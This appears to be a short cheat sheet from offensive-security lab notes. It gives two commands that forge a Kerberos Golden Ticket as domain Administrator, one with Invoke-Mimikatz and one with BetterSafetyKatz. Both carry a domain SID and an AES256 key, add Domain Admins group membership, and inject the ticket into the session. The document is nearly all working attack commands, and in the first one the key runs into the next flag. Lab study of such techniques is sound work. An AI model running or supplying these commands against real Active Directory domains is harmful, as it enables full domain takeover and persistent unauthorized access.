# Golden Ticket

## MimiKatz Golden Ticket

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511/aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6aid:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

## BetterSafetyKatz Golden Ticket

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
